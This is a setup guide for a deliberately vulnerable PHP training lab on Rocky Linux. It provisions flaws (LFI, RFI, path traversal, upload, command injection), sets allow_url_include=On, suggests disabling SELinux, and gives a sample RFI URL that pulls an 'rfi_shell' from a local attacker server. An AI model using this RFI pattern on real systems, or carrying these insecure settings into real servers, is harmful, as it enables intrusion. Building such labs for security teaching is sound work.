# Step-by-Step Guide: Deploying Lab 01 on a Rocky Linux VM (Rocky 8 / 9)

Follow these steps to set up and provision the **Lab 01 NexaCorp Employee Portal** environment on a Rocky Linux Virtual Machine.

---

## 📋 Prerequisites & Package Installation

Open a terminal on your Rocky Linux VM and install Apache, PHP-FPM, Git, and essential dependencies:

```bash
# 1. Update system packages
sudo dnf update -y

# 2. Install Apache (httpd), PHP, PHP-FPM, and Git
sudo dnf install -y httpd php php-fpm git policycoreutils-python-utils

# 3. Enable and start Apache and PHP-FPM services
sudo systemctl enable --now httpd
sudo systemctl enable --now php-fpm
```

---

## 🔒 Firewall & SELinux Setup

### 1. Open Lab Port 8081 in Firewall
```bash
sudo firewall-cmd --permanent --add-port=8081/tcp
sudo firewall-cmd --reload
```

### 2. Configure SELinux Policy
Allow Apache to perform proxy connections to the PHP-FPM UNIX socket:

```bash
# Allow HTTPD network and socket connections
sudo setsebool -P httpd_can_network_connect 1
sudo setsebool -P httpd_execmem 1

# Label lab directory contexts
sudo mkdir -p /srv/labs/lab01
sudo semanage fcontext -a -t httpd_sys_rw_content_t "/srv/labs/lab01(/.*)?"
sudo restorecon -R -v /srv/labs/lab01
```

*(Note: If testing in a lab environment where SELinux isn't required to be enforcing, `sudo setenforce 0` can be used temporarily).*

---

## 🚀 Provisioning Lab 01 with `setup.sh`

### 1. Clone or Copy the Repository
```bash
git clone https://github.com/Abdelrhman-Mohamedd/EHPT_01.git
cd EHPT_01
```

### 2. Run the Provisioning Script with Student ID
Execute `setup.sh` as root, specifying the student's unique ID:

```bash
# Syntax: sudo ./setup.sh <STUDENT_ID> [SECRET_SALT]
sudo ./setup.sh abdelrhman_h_2026
```

### What `setup.sh` Automatically Does:
1. Creates the `lab01` system user and `/srv/labs/lab01/{public,data,public/uploads,sessions}` directories.
2. Derives unique SHA-256 flags for LFI, RFI, Path Traversal, File Upload, and Command Injection.
3. Installs `/etc/php-fpm.d/lab01.conf` pool listener (`/run/php-fpm/lab01.sock`) with `allow_url_include=On`.
4. Installs `/etc/httpd/conf.d/lab01.conf` VirtualHost on port `8081`.
5. Binds VM identity: updates system hostname to `lab01-abdelrhman-h-2026`, MOTD/banner, and web portal header badge.
6. Adds `127.0.0.1 employeeportal.local` to `/etc/hosts` and reloads Apache & PHP-FPM.

---

## 🧪 Verifying the Deployment

### 1. Test Web Access
Open a browser inside the VM (or from host if network mode is Bridged/Host-Only):
- **URL:** `http://employeeportal.local:8081` or `http://127.0.0.1:8081`

### 2. (Optional) Run RFI Attacker Server Offline
In a separate terminal on the VM, start the offline HTTP helper server:
```bash
./attacker_helper.py
```
Test RFI in the portal at:
`http://employeeportal.local:8081/config_loader.php?template=http://127.0.0.1:8000/rfi_shell`

---

## 📊 Instructor Flag Verification

To check or verify flags submitted by a student:

```bash
# View expected flags for student
./generate_student_flags.py abdelrhman_h_2026

# Verify submitted flag string
./generate_student_flags.py abdelrhman_h_2026 --verify FLAG{5b03425554da4aede733fb9f1fcf83b7}
```
